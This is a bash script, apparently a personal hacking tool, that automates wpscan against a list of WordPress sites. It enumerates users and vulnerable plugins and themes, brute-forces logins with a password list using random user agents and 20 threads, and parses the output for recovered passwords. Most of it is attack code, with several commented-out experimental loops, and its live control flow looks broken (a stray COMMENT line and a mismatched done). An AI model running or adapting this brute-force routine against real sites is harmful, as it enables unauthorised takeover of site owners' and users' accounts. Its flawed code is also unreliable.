#!/bin/bash
# A script for auto brute forcing users based on wpscan

printf '\n########################################################################\n'
printf '##                 WordPress Auto Brute Force Users                   ##\n'
printf '##                     Leighton-0    (Jan 2023)                       ##\n'
printf '########################################################################\n\n'

sleep 3
#"result.${d}.parsed""result.${d}.parsed"
#rm results*
d=`date +"%y%m%d"`									# creates a date variable in the form yymmdd
wl_pass=wp-links_cut
#wpscan --update
#read -p $'\e[1;92m File path for targets: \e[0m' wl_pass				# -p prompt asks for a file name for the list of sites - names this site wl_pass

wl_pass="${wl_pass}"									# creates a variable called wp_pass

count_pass=$(wc -l $wl_pass | cut -d " " -f1)						# cut -d " " -f1 -->> takes the only the numerical value from the wc -l output (eg 70 wp-links) 
											# counts the number of lines in wp_pass file

#for fn in `cat $wl_pass`; do
#wpscan --url $fn -e  u vp vt --passwords zz_passwords --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results"
											# Note: wp-login can be interchanged with xmlrpc or xmlrpcmulitcall.
											# Default thresds is 20, can be changed.

: << 'COMMENT'
##########  BY ME   #################
#if [[ tail -f results.${d} | grep -o0 -q "Error:\|Scan Aborted:";
if [ "tail -1 -f results.${d}" == "Error" ];		 # -n 1 one line -f follow
then
	echo "error detected"
	continue
fi

######################################
COMMENT

: << 'COMMENT'
##########  BY ME   #################
while [ $("tail -1 -f results" | grep -o0 -c "Error") -eq 0 ]; do continue; done

#####################################
COMMENT

: << 'COMMENT'
##########  BY ME   #################
tail -f "results" | grep --line-buffered "Error" | while read line ; do
	continue
done
COMMENT

: << 'COMMENT'
##########  BY ME   #################
while true
do
        if grep -qi "Error\|aborted" results ; then						# -qi --> case insensitive & quiet ( OP is either 0 true or 1 false
       continue 2										# continue within IF advances to the next element; every other loop continues within element
    fi
done

#####################################
COMMENT

#: << 'COMMENT'
##########  BY ME   #################
while true
do
	timestamp=`date +%s`									# create variable called timestamp; seconds since 1970-01-01 00:00:00 UTC
    	echo start $timestamp >> results							# add variable "timestamp" to file "results"
		for fn in `cat $wl_pass`; do
		wpscan --url $fn -e  u vp vt --passwords zz_passwords --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results"
												# 
    	echo end $timestamp >> results								# seconds since 1970-01-01 00:00:00 UTC

   	if sed -n '/start $timestamp/,/end $timestamp/p' results | grep -E Error ; then		# -n suppress automatic printing of pattern space
       	break
#	continue
 	fi
done
#===========END======================
COMMENT

: << 'COMMENT'
##########  BY ME   #################
while true
do
        timestamp=`date +%s`                                                                    # create variable called timestamp; seconds since 1970-01-01 00:00:00 UTC
         echo start $timestamp >> results                                                        # add variable "timestamp" to file "results"



#       ./trigger_event_in_app
        continue 2                                                                              #
        echo end $timestamp >> results                                                          # seconds since 1970-01-01 00:00:00 UTC

        if sed -n '/start $timestamp/,/end $timestamp/p' results | grep Error ; then            # -n suppress automatic printing of pattern space
        break
#	continue 2

   fi
done
#####################################
COMMENT







done

printf "Finished - check the results"
printf '\n\n\n\n'

cat results | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed" 

#cat results.${d} | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed"

cat results.${d}.parsed

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
